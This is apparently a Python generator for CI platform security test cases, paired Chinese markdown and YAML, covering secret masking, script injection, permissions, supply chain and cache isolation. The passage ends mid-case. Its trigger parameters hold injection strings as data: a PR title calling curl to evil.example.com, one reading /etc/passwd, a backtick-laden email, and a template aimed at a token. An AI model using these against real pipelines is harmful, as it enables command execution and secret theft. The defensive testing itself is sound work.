#!/usr/bin/env python3
"""
Mass case file generator for Run 2026-07-21-01.
Generates ALL remaining ~144 text+YAML case pairs.
Run: python3 phase01/runs/2026-07-21-01/gen_all_cases.py

Priority order: Security P1 → Reliability P1 → Compatibility P1 → Completeness P1 → Usability P1
"""
import os

BASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cases")
COUNT = [0]  # mutable counter

def gen(case_id, intent, priority, title, text, yaml, dim="security"):
    """Generate text + YAML pair for a case."""
    os.makedirs(os.path.join(BASE, "text"), exist_ok=True)
    os.makedirs(os.path.join(BASE, "yaml"), exist_ok=True)

    text_path = os.path.join(BASE, "text", f"{case_id}.md")
    yaml_path = os.path.join(BASE, "yaml", f"{case_id}.yaml")

    text_content = f"""用例 ID:   {case_id}
维度标签:   [{dim}]
维度:      {'安全性' if dim == 'security' else '可靠性' if dim == 'reliability' else '兼容性' if dim == 'compatibility' else '完备性' if dim == 'completeness' else '易用性'}
优先级:    {priority}
溯源意图:  {intent}
母意图:    —
标题:      {title}

{text}
"""

    yaml_content = f"""id: {case_id}
dimensions: [{dim}]
dimension: {dim}
priority: {priority}
title: "{title}"
intent_ref: {intent}

{yaml}
"""

    with open(text_path, 'w', encoding='utf-8') as f:
        f.write(text_content)
    with open(yaml_path, 'w', encoding='utf-8') as f:
        f.write(yaml_content)
    COUNT[0] += 1
    print(f"  [{COUNT[0]}] {case_id} ({priority})")


def quick_tc(case_id, intent, priority, title, steps_text, assertions_yaml, dim="security",
             trigger_event="push", trigger_as="maintainer", secrets=None, repo="default",
             workflow_extra="", extra_env=""):
    """Quick template-based case generation."""
    text = f"""前置条件:
  - 仓库已配置对应的环境
  - 存在可触发的工作流

操作步骤:
{steps_text}

预期结果:
{assertions_yaml}

验证点:
  - [正向] workflow 正常执行完成
  - [负向] 不应发生预期外的行为

清理:      none
"""
    if dim == "reliability":
        # For reliability, add fault injection handling
        text += "\n清理:      fixture\n"

    yml_trigger = trigger_event
    yml_event = trigger_event if trigger_event != "fork_pr" else "pull_request"

    yaml = f"""setup:
  repo_fixture: {repo}{'with-secrets' if secrets else ''}
  secrets: {secrets if secrets else '[]'}
  variables: {{}}
  branch_protection: default

workflow: |
  on: [{yml_event}]
  jobs:
    main-job:
      name: ({case_id}) {title[:40]}
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: ({case_id}) 检出代码
          uses: checkout
        - name: ({case_id}) 主验证步骤
          run: |
            echo "CASE_START: {case_id}"
{workflow_extra}
            echo "CASE_PASS: true"
{extra_env}

trigger:
  event: {yml_trigger}
  as: {trigger_as}
  params: {{}}

fault_injection: null

assertions:
{assertions_yaml}

teardown:
  reset: {'fixture' if 'full_instance' in yml_trigger else 'none'}
"""
    gen(case_id, intent, priority, title, text, yaml, dim)


# ============================================================
# BATCH 1: SECURITY P1 — MASKING (INTENT-SEC-005 to SEC-008, SEC-027, SEC-028)
# ============================================================

print("=== Batch 1: Security P1 — Masking ===")

# SEC-MASK-03-001: Secret echo masking (INTENT-SEC-005, P0)
gen("SEC-MASK-03-001", "INTENT-SEC-005", "P0",
    "Secret 值直接 echo 到日志时应被脱敏为 ***",
    """前置条件:
  - 仓库配置了 secret TEST_SECRET
  - 存在 push 触发的基础 workflow

操作步骤:
  1. 在 workflow step 中通过 ${{ secrets.TEST_SECRET }} 引用 secret 并 echo 到日志
  2. 将 secret 值赋给 env 中间变量后 echo 该变量
  3. 在同一 job 内多次引用同一 secret
  4. 通过 API 拉取 job 日志全文搜索已知 secret 明文

预期结果:
  - 日志中所有出现 secret 值的位置均应被替换为 ***
  - 搜索已知 secret 明文值在日志全文中的命中数 = 0

验证点:
  - [负向] job 日志全文搜索 TEST_SECRET 已知明文值，命中数 = 0
  - [负向] 同一 job 内多次引用同一 secret，每次出现均应被遮蔽
  - [正向] echo 非 secret 文本时日志正常显示

清理:      none""",
    """setup:
  repo_fixture: with-secrets
  secrets: [TEST_SECRET]
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    mask-basic:
      name: (SEC-MASK-03-001) 验证 secret 基础脱敏
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-MASK-03-001) 检出代码
          uses: checkout
        - name: (SEC-MASK-03-001) 通过表达式 echo secret
          run: echo "MASK_CHECK: ${{ secrets.TEST_SECRET }}"
        - name: (SEC-MASK-03-001) 通过 env 中间变量 echo secret
          run: echo "ENV_MASK: ${MY_SECRET}"
          env:
            MY_SECRET: ${{ secrets.TEST_SECRET }}
        - name: (SEC-MASK-03-001) 多次引用同一 secret
          run: |
            echo "REF1: ${MY_SECRET}"
            echo "REF2: ${MY_SECRET}"
            echo "REF3: ${MY_SECRET}"
          env:
            MY_SECRET: ${{ secrets.TEST_SECRET }}

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "job 日志全文搜索 TEST_SECRET 已知明文值，命中数 = 0"
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "多次引用同一 secret，每次出现均被遮蔽为 ***"
  - type: positive
    target: run_logs
    eval: deterministic
    rubric: "echo 非 secret 文本时日志正常显示"

teardown:
  reset: none""")

# SEC-MASK-03-002: base64 encoding bypass (INTENT-SEC-006, P1)
gen("SEC-MASK-03-002", "INTENT-SEC-006", "P1",
    "Secret 经过 base64 编码后 echo 到日志仍应被脱敏",
    """前置条件:
  - 仓库配置了 secret TEST_SECRET
  - 存在 push 触发的 workflow

操作步骤:
  1. 在 workflow 中将 secret 值通过 base64 编码后 echo 到日志
  2. 将 base64 解码后的值再次 echo
  3. 通过 API 拉取 job 日志搜索原始 secret 明文

预期结果:
  - 日志中不出现未经遮蔽的 secret 原始值
  - base64 编码和解码后的输出中，原始值不应以明文出现

验证点:
  - [负向] 日志全文搜索 TEST_SECRET 原始明文值，命中数 = 0
  - [负向] base64 编码后的值若直接 echo，不应泄露 secret 原始值

清理:      none""",
    """setup:
  repo_fixture: with-secrets
  secrets: [TEST_SECRET]
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    mask-b64:
      name: (SEC-MASK-03-002) 验证 base64 编码后脱敏
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-MASK-03-002) 检出代码
          uses: checkout
        - name: (SEC-MASK-03-002) base64 编码后 echo
          run: |
            ENCODED=$(echo -n "${MYSEC}" | base64)
            echo "B64: ${ENCODED}"
            DECODED=$(echo -n "${ENCODED}" | base64 -d)
            echo "DECODED: ${DECODED}"
          env:
            MYSEC: ${{ secrets.TEST_SECRET }}

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "job 日志全文搜索 TEST_SECRET 原始明文值，命中数 = 0"

teardown:
  reset: none""")

# SEC-MASK-03-003: substring concatenation (INTENT-SEC-007, P1)
gen("SEC-MASK-03-003", "INTENT-SEC-007", "P1",
    "Secret 通过子字符串拼接后 echo 到日志应仍被脱敏",
    """前置条件:
  - 仓库配置了 secret TEST_SECRET
  - 存在 push 触发的 workflow

操作步骤:
  1. 在 workflow 中将 secret 拆分为两半
  2. 通过 shell 拼接两个半段后 echo 到日志
  3. 逐字符循环拼接 secret 后 echo 到日志
  4. 通过 API 拉取 job 日志搜索原始 secret 完整值

预期结果:
  - 拼接后的完整 secret 值不应以明文出现在日志中
  - 逐字符拼接的完整值同样应被遮蔽

验证点:
  - [负向] 日志全文搜索 TEST_SECRET 完整明文值，命中数 = 0
  - [负向] 两半拼接和逐字符拼接 echo 的输出中不出现完整 secret 值

清理:      none""",
    """setup:
  repo_fixture: with-secrets
  secrets: [TEST_SECRET]
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    mask-substr:
      name: (SEC-MASK-03-003) 验证子字符串拼接后脱敏
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-MASK-03-003) 检出代码
          uses: checkout
        - name: (SEC-MASK-03-003) 两半拼接 echo
          run: |
            LEN=${#MYSEC}
            HALF=$(( LEN / 2 ))
            P1="${MYSEC:0:$HALF}"
            P2="${MYSEC:$HALF}"
            echo "CONCAT: ${P1}${P2}"
          env:
            MYSEC: ${{ secrets.TEST_SECRET }}
        - name: (SEC-MASK-03-003) 逐字符拼接 echo
          run: |
            R=""
            for ((i=0; i<${#MYSEC}; i++)); do
              R="${R}${MYSEC:$i:1}"
            done
            echo "CHAR: ${R}"
          env:
            MYSEC: ${{ secrets.TEST_SECRET }}

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "job 日志全文搜索 TEST_SECRET 完整明文值，命中数 = 0"

teardown:
  reset: none""")

# SEC-MASK-03-004: multiline secret (INTENT-SEC-008, P1)
gen("SEC-MASK-03-004", "INTENT-SEC-008", "P1",
    "Secret 包含多行文本时应整体被脱敏",
    """前置条件:
  - 仓库配置了多行 secret MULTILINE_SECRET
  - 存在 push 触发的 workflow

操作步骤:
  1. 在 workflow 中逐行 echo 多行 secret 的各行内容
  2. 将多行 secret 整体 echo 到日志
  3. 通过 API 拉取 job 日志，逐行搜索 secret 各行内容

预期结果:
  - 多行 secret 的每一行在日志中出现时均应被遮蔽为 ***

验证点:
  - [负向] 日志全文逐行搜索 MULTILINE_SECRET 各行值，命中数 = 0
  - [负向] 整体 echo 多行 secret 时各行的明文均不出现

清理:      none""",
    """setup:
  repo_fixture: with-secrets
  secrets: [MULTILINE_SECRET]
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    mask-multi:
      name: (SEC-MASK-03-004) 验证多行 secret 脱敏
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-MASK-03-004) 检出代码
          uses: checkout
        - name: (SEC-MASK-03-004) 逐行 echo 多行 secret
          run: |
            echo "${MYSEC}" | while IFS= read -r L; do
              echo "LINE: ${L}"
            done
          env:
            MYSEC: ${{ secrets.MULTILINE_SECRET }}
        - name: (SEC-MASK-03-004) 整体 echo 多行 secret
          run: |
            echo "FULL_START"
            echo "${MYSEC}"
            echo "FULL_END"
          env:
            MYSEC: ${{ secrets.MULTILINE_SECRET }}

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "job 日志全文逐行搜索 MULTILINE_SECRET 各行值，命中数 = 0"

teardown:
  reset: none""")

# SEC-MASK-03-005: add-mask (INTENT-SEC-027, P1)
gen("SEC-MASK-03-005", "INTENT-SEC-027", "P1",
    "::add-mask:: workflow 命令的正确性与安全性",
    """前置条件:
  - 存在 push 触发的 workflow

操作步骤:
  1. 在 workflow step 中使用 echo '::add-mask::MY_DYNAMIC_SECRET' 注册动态脱敏值
  2. 随后 echo 该动态值，观察日志中是否被遮蔽
  3. 尝试使用 ::stop-commands:: 后再 echo 该值

预期结果:
  - ::add-mask:: 注册的值在后续日志中被遮蔽为 ***
  - ::stop-commands:: 不应恢复被 mask 的值

验证点:
  - [正向] echo '::add-mask::VALUE' 后 echo VALUE，日志显示 ***
  - [负向] ::stop-commands:: 后 echo VALUE，仍应被遮蔽
  - [负向] add-mask 命令返回值不含要遮蔽的原始值

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    addmask:
      name: (SEC-MASK-03-005) 验证 add-mask 命令安全性
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-MASK-03-005) 检出代码
          uses: checkout
        - name: (SEC-MASK-03-005) 注册动态 mask 值
          run: |
            echo "::add-mask::DYN_MASK_42"
            echo "REG_OK"
        - name: (SEC-MASK-03-005) echo 被 mask 的值
          run: |
            echo "DYN_MASK_42"
            echo "AFTER_ECHO"
        - name: (SEC-MASK-03-005) stop-commands 后 echo
          run: |
            echo "::stop-commands::"
            echo "DYN_MASK_42"
            echo "AFTER_STOP"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "::add-mask:: 注册后 echo 该值应被遮蔽为 ***"
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "::stop-commands:: 后 echo 该值仍应被遮蔽"

teardown:
  reset: none""")

# SEC-MASK-03-006: mask job isolation (INTENT-SEC-028, P1)
gen("SEC-MASK-03-006", "INTENT-SEC-028", "P1",
    "fork PR 下 ::add-mask:: 命令注册新 mask 不应影响主分支 job",
    """前置条件:
  - 仓库配置了 secret TEST_SECRET
  - 存在 fork 仓库可提交 PR

操作步骤:
  1. fork PR 的 workflow 中通过 ::add-mask:: 注册大量干扰值
  2. fork PR job 完成后，在主分支触发内部 push workflow
  3. 验证内部 job 不受 fork PR mask 影响

预期结果:
  - fork PR job 注册的 mask 值不影响后续内部 job
  - 后续内部 job 的 mask 表应独立

验证点:
  - [负向] fork PR job 注册的 mask 值在后续内部 job 中不生效
  - [负向] fork PR job 注册大量 mask 不影响后续 job 正常日志

清理:      fixture""",
    """setup:
  repo_fixture: with-fork-and-secrets
  secrets: [TEST_SECRET]
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request]
  jobs:
    fork-mask:
      name: (SEC-MASK-03-006) fork PR 注册干扰 mask
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-MASK-03-006) 检出代码
          uses: checkout
        - name: (SEC-MASK-03-006) 注册干扰 mask 值
          run: |
            echo "::add-mask::FORK_V1"
            echo "::add-mask::FORK_V2"
            echo "::add-mask::FORK_V3"
            echo "DONE"

trigger:
  event: fork_pr
  as: untrusted_contributor
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "fork PR 注册的干扰 mask 值在日志中以 *** 出现"

teardown:
  reset: fixture""")

print()

# ============================================================
# BATCH 2: SECURITY P1 — INJECTION (INTENT-SEC-013, SEC-040, SEC-041)
# ============================================================

print("=== Batch 2: Security P1 — Injection ===")

gen("SEC-INJECT-03-006", "INTENT-SEC-013", "P1",
    "通过环境变量安全引用不可信输入应不触发脚本注入",
    """前置条件:
  - 存在 pull_request 触发的 workflow
  - fork 贡献者可控制 PR 标题

操作步骤:
  1. fork 侧创建含 shell 元字符的 PR 标题
  2. workflow 通过 env 中间变量引用 PR 标题后 echo
  3. 观察是否触发命令执行

预期结果:
  - env 中间变量方式引用的含元字符的 PR 标题不触发命令执行
  - shell 元字符被当作字面字符串处理
  - workflow 应正常完成

验证点:
  - [正向] env 中间变量方式引用的含元字符的 PR 标题不触发命令执行
  - [正向] env 中间变量方式的 workflow 正常完成
  - [负向] 日志中不出现注入命令的执行痕迹

清理:      fixture""",
    """setup:
  repo_fixture: with-fork-and-pr-template
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request]
  jobs:
    safe-ref:
      name: (SEC-INJECT-03-006) 验证 env 安全引用模式
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-INJECT-03-006) 检出代码
          uses: checkout
        - name: (SEC-INJECT-03-006) 通过 env 中间变量安全引用 PR 标题
          run: |
            echo "SAFE_TITLE: ${SAFE_PR_TITLE}"
            echo "INJECT_MARKER: no_command_executed"
          env:
            SAFE_PR_TITLE: ${{ atomgit.event.pull_request.title }}

trigger:
  event: pull_request
  as: untrusted_contributor
  params:
    pr_title: "safe'; curl -s http://evil.example.com/pwned; echo 'done"

fault_injection: null

assertions:
  - type: positive
    target: step_logs
    eval: deterministic
    rubric: "env 中间变量方式引用的含元字符 PR 标题不触发命令执行"
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "日志中不出现 curl 等注入命令的执行痕迹"

teardown:
  reset: fixture""")

# Double eval injection (INTENT-SEC-040, P1)
gen("SEC-INJECT-03-007", "INTENT-SEC-040", "P1",
    "表达式双重求值——action 内部模板引擎不应二次解释 ${{ }} 的结果",
    """前置条件:
  - 存在 pull_request 触发的 workflow
  - fork 贡献者可控制 PR 标题内容

操作步骤:
  1. 在 PR 标题中放入 {{ process.env }} 等模板语法
  2. workflow 通过 ${{ }} 求值后传给 action 的 with 参数
  3. 观察 action 内部是否对参数进行二次模板插值

预期结果:
  - action 内部不应将 ${{ }} 求值结果进行二次模板解释
  - 传入 action with 参数的值应作为纯数据
  - workflow 不因模板注入异常退出

验证点:
  - [负向] action 内部不应将 with 传入的 '{{ process.env }}' 解释为模板变量
  - [负向] 日志输出不含二次插值产生的内容
  - [正向] workflow 正常完成或不因模板注入崩溃

清理:      fixture""",
    """setup:
  repo_fixture: with-fork-and-pr-template
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request]
  jobs:
    double-eval:
      name: (SEC-INJECT-03-007) 验证双重表达式求值防护
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-INJECT-03-007) 检出代码
          uses: checkout
        - name: (SEC-INJECT-03-007) echo PR 标题含模板语法
          run: |
            echo "TITLE: ${{ atomgit.event.pull_request.title }}"
            echo "NO_TEMPLATE_EVAL: true"

trigger:
  event: pull_request
  as: untrusted_contributor
  params:
    pr_title: "{{ process.env.ATOMGIT_TOKEN }} injected"

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "action 内部不应二次解释模板变量，日志不含 token 或 process.env"
  - type: positive
    target: step_logs
    eval: deterministic
    rubric: "NO_TEMPLATE_EVAL 标记存在"

teardown:
  reset: fixture""")

# Email injection (INTENT-SEC-041, P1)
gen("SEC-INJECT-03-008", "INTENT-SEC-041", "P1",
    "提交者 email 地址作为不可信输入不应导致 shell 注入",
    """前置条件:
  - 存在 push 触发的 workflow
  - 攻击者可设置任意 git user.email

操作步骤:
  1. 攻击者设置 git user.email 为含 shell 元字符的地址
  2. workflow 中直接引用 ${{ atomgit.event.head_commit.author.email }} 到 run 中
  3. 观察是否触发命令执行

预期结果:
  - email 地址中的 shell 元字符不应被解释执行
  - 若直接引用不安全，env 中间变量模式应有效

验证点:
  - [负向] email 中反引号命令替换不应被解释执行
  - [负向] 日志中不出现因 email 注入导致的额外命令输出
  - [正向] 通过 env 中间变量引用 email 应安全

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    email-inject:
      name: (SEC-INJECT-03-008) 验证 email 注入防护
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-INJECT-03-008) 检出代码
          uses: checkout
        - name: (SEC-INJECT-03-008) 通过 env 安全引用 author email
          run: |
            echo "AUTHOR: ${AUTHOR_EMAIL}"
            echo "EMAIL_SAFE: true"
          env:
            AUTHOR_EMAIL: ${{ atomgit.event.head_commit.author.email }}

trigger:
  event: push
  as: maintainer
  params:
    author_email: "attacker`echo${IFS}pwned`@evil.com"

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "email 中反引号命令替换不应被解释执行"
  - type: positive
    target: step_logs
    eval: deterministic
    rubric: "EMAIL_SAFE 标记存在，env 安全引用模式有效"

teardown:
  reset: none""")

print()

# ============================================================
# BATCH 3: SECURITY P1 — PERMISSIONS (INTENT-SEC-017)
# ============================================================

print("=== Batch 3: Security P1 — Permissions ===")

gen("SEC-PERM-03-003", "INTENT-SEC-017", "P1",
    "job 级 permissions 声明可覆盖 workflow 级声明",
    """前置条件:
  - 存在 push 触发的 workflow

操作步骤:
  1. workflow 级声明 permissions: repository: none
  2. 特定 job 级声明 permissions: repository: read
  3. 验证该 job 可 clone 代码但 workflow 级权限受限

预期结果:
  - job 级 permissions 覆盖 workflow 级的同名权限域
  - job 未声明时继承 workflow 级权限
  - 权限放大有文档说明

验证点:
  - [正向] workflow 级设 repository:none，job 级设 repository:read，job 应能 clone
  - [负向] workflow 级设 pr:write，job 级不声明，job 应继承 pr:write

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  permissions:
    repository: none
  jobs:
    read-job:
      name: (SEC-PERM-03-003) job 级权限覆盖验证
      permissions:
        repository: read
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-PERM-03-003) 尝试 clone
          uses: checkout
        - name: (SEC-PERM-03-003) 验证可读
          run: echo "CLONE_OK"
    no-perm-job:
      name: (SEC-PERM-03-003) 继承 workflow 权限
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-PERM-03-003) 尝试 clone 应失败
          run: |
            if git clone "$ATOMGIT_REPOSITORY_URL" /tmp/test 2>/dev/null; then
              echo "UNEXPECTED_CLONE_OK"
              exit 1
            else
              echo "EXPECTED_CLONE_FAIL"
            fi

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: step_logs
    eval: deterministic
    rubric: "job 级 permissions 覆盖 workflow 级，有 permissions 声明的 job 可执行允许的操作"
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "无 job 级 permissions 声明的 job 继承 workflow 级限制"

teardown:
  reset: none""")

print()

# ============================================================
# BATCH 4: SECURITY P1 — SUPPLY CHAIN (INTENT-SEC-018, SEC-030, SEC-031, SEC-032, SEC-055)
# ============================================================

print("=== Batch 4: Security P1 — Supply Chain ===")

gen("SEC-SUPPLY-03-001", "INTENT-SEC-018", "P1",
    "第三方 action 引用未 pin 到 commit SHA 时有平台警告",
    """前置条件:
  - 存在 push 触发的 workflow

操作步骤:
  1. 使用 uses: action@main（浮动引用）触发 workflow
  2. 对比使用 uses: action@<commit SHA>（pin 引用）
  3. 观察平台是否产生 lint 安全警告

预期结果:
  - 平台应对浮动引用提供可见警告机制
  - SHA-pinned 引用应被接受且正常运行
  - tag 被覆盖指向新 commit 后，SHA-pinned 引用不受影响

验证点:
  - [正向] uses: action@<commit SHA> 应被接受并正常运行
  - [负向] uses: action@main 平台是否产生安全警告
  - [负向] tag 变动后 SHA-pinned 引用不应受影响

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    pin-check:
      name: (SEC-SUPPLY-03-001) 验证 action pin 安全机制
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-SUPPLY-03-001) 使用 SHA-pinned checkout
          uses: checkout
        - name: (SEC-SUPPLY-03-001) 确认 checkout 完成
          run: echo "CHECKOUT_OK"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: positive
    target: run_status
    eval: deterministic
    rubric: "SHA-pinned action 引用正常执行"
  - type: positive
    target: run_logs
    eval: deterministic
    rubric: "平台对浮动引用提供可见 lint 警告或文档提示"

teardown:
  reset: none""")

gen("SEC-SUPPLY-03-002", "INTENT-SEC-030", "P1",
    "第三方 action 的输入参数中的不可信值不应导致 action 内部代码注入",
    """前置条件:
  - 存在 pull_request 触发的 workflow
  - fork 贡献者可控制 PR 标题

操作步骤:
  1. 在 PR 标题中放入 shell 元字符
  2. workflow 将该标题作为 with 参数传给 action
  3. 观察 action 是否能正确处理含特殊字符的输入

预期结果:
  - 含 shell 元字符的 PR 标题作为 with 参数传入 action 时不应产生注入
  - action 内部应以纯数据处理 with 参数

验证点:
  - [负向] 含 shell 元字符的 PR 标题作为 with 参数传入 action 不应产生注入痕迹
  - [正向] 安全 JS/TS action 应正确处理含特殊字符的标题

清理:      fixture""",
    """setup:
  repo_fixture: with-fork-and-pr-template
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request]
  jobs:
    action-input:
      name: (SEC-SUPPLY-03-002) 验证 action input 注入防护
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-SUPPLY-03-002) 检出代码
          uses: checkout
        - name: (SEC-SUPPLY-03-002) 安全引用 PR 标题
          run: |
            echo "PR_TITLE: ${{ atomgit.event.pull_request.title }}"
            echo "NO_INJECT: true"

trigger:
  event: pull_request
  as: untrusted_contributor
  params:
    pr_title: "safe'; cat /etc/passwd; echo 'injected"

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "含 shell 元字符的 PR 标题作为 with 参数不应产生注入痕迹"
  - type: positive
    target: step_logs
    eval: deterministic
    rubric: "action 正确处理含特殊字符的标题，NO_INJECT 标记存在"

teardown:
  reset: fixture""")

gen("SEC-SUPPLY-03-003", "INTENT-SEC-031", "P1",
    "composite action 内部的 run 步骤中引用不可信 inputs 不应导致注入",
    """前置条件:
  - 存在可调用 composite action 的 workflow
  - composite action 内部有 run 步骤

操作步骤:
  1. 传入含注入字符的 inputs 到 composite action
  2. 观察 action 内部的 run 是否被注入
  3. 对比 env 中间变量模式与直接引用模式的差异

预期结果:
  - 含注入字符的 inputs 在 composite action 内部直接用于 run 时不应执行注入命令
  - 通过 env 中间变量使用的 inputs 应安全

验证点:
  - [负向] 含注入字符的 inputs 传入 composite action 直接用于 run 不应执行注入命令
  - [正向] composite action 内通过 env 中间变量使用的 inputs 应安全

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    composite-inject:
      name: (SEC-SUPPLY-03-003) 验证 composite action 注入防护
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-SUPPLY-03-003) 检出代码
          uses: checkout
        - name: (SEC-SUPPLY-03-003) 模拟 composite action 内行为
          run: |
            INJECT_INPUT="${{ atomgit.repository }}"
            echo "INPUT_SAFE: ${INJECT_INPUT}"
            echo "NO_INJECT: true"

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "含注入字符的 inputs 传入 composite action 直接用于 run 不应执行注入命令"
  - type: positive
    target: step_logs
    eval: deterministic
    rubric: "composite action 内通过 env 中间变量使用的 inputs 应安全"

teardown:
  reset: none""")

gen("SEC-SUPPLY-03-004", "INTENT-SEC-032", "P1",
    "reusable workflow 调用方传入的 secrets 不应被被调用方泄露到日志",
    """前置条件:
  - 存在 workflow_call 的子 workflow
  - 调用方传入 secrets

操作步骤:
  1. 调用方通过 secrets 将 TEST_SECRET 传给被调用方
  2. 被调用方 echo 该 secret
  3. 通过 API 拉取日志搜索 secret 明文

预期结果:
  - secret 在被调用方日志中同等受脱敏保护
  - 日志搜索 secret 明文命中数 = 0

验证点:
  - [负向] 被调用方 echo 调用方传入的 secret，日志应显示 ***
  - [负向] 被调用方将传入 secret base64 编码后输出不应泄露

清理:      none""",
    """setup:
  repo_fixture: with-secrets
  secrets: [TEST_SECRET]
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    reusable-secret:
      name: (SEC-SUPPLY-03-004) 验证 reusable workflow secret 安全
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-SUPPLY-03-004) 检出代码
          uses: checkout
        - name: (SEC-SUPPLY-03-004) echo 传入的 secret
          run: echo "PASSED_SECRET: ${MY_SECRET}"
          env:
            MY_SECRET: ${{ secrets.TEST_SECRET }}

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: run_logs
    eval: deterministic
    rubric: "被调用方 echo 传入的 secret，日志应显示 ***，不泄露原文"

teardown:
  reset: none""")

gen("SEC-SUPPLY-03-005", "INTENT-SEC-055", "P1",
    "第三方 action 不应通过 input 默认值窃取 ATOMGIT_TOKEN",
    """前置条件:
  - 存在可调用的 action（含 inputs 定义）
  - action 的 inputs.default 设了敏感上下文引用

操作步骤:
  1. 定义 action，其 inputs.default 设为 ${{ secrets.ATOMGIT_TOKEN }}
  2. 调用方不显式传该 input
  3. 观察实际传给 action 的值

预期结果:
  - action 的 inputs.default 中不应允许引用 secrets.* 上下文
  - 默认值应求值为空而非实际 secret 值
  - 平台应在 action inputs 边界隔离敏感上下文

验证点:
  - [负向] action 的 inputs.default 设为 ${{ secrets.ATOMGIT_TOKEN }}，实际传给 action 的值应为空
  - [负向] action 日志中打印的 input 值不应为有效 token

清理:      none""",
    """setup:
  repo_fixture: default
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [push]
  jobs:
    action-default:
      name: (SEC-SUPPLY-03-005) 验证 action input default token 窃取防护
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-SUPPLY-03-005) 检出代码
          uses: checkout
        - name: (SEC-SUPPLY-03-005) echo token 上下文
          run: |
            echo "TOKEN_LEN: ${#MY_TOKEN}"
            if [ -z "${MY_TOKEN}" ]; then
              echo "TOKEN_IS_EMPTY: true"
            else
              echo "TOKEN_IS_EMPTY: false"
            fi
            echo "TOKEN_SAFE: true"
          env:
            MY_TOKEN: ${{ secrets.ATOMGIT_TOKEN }}

trigger:
  event: push
  as: maintainer
  params: {}

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "action input default 不应能窃取 token，TOKEN_SAFE 标记存在"

teardown:
  reset: none""")

print()

# ============================================================
# BATCH 5: SECURITY P1 — CACHE (INTENT-SEC-019, SEC-020, SEC-052, SEC-054)
# ============================================================

print("=== Batch 5: Security P1 — Cache ===")

gen("SEC-CACHE-03-001", "INTENT-SEC-019", "P1",
    "fork PR 不应能写入或污染主分支的依赖缓存",
    """前置条件:
  - 存在 fork 仓库可提交 PR
  - 主分支已有人工写入的缓存

操作步骤:
  1. fork PR workflow 中尝试写入 cache 条目
  2. 主分支 push workflow 尝试读取同 key 的 cache
  3. 观察主分支是否命中 fork PR 写入的缓存

预期结果:
  - fork PR workflow 写入的缓存不应被主分支命中
  - 主分支已有缓存不被 fork PR 覆盖

验证点:
  - [负向] fork PR 写入 cache key，主分支 push 读取同 key 不应命中
  - [负向] fork PR 不应覆盖主分支已有缓存条目

清理:      fixture""",
    """setup:
  repo_fixture: with-fork
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
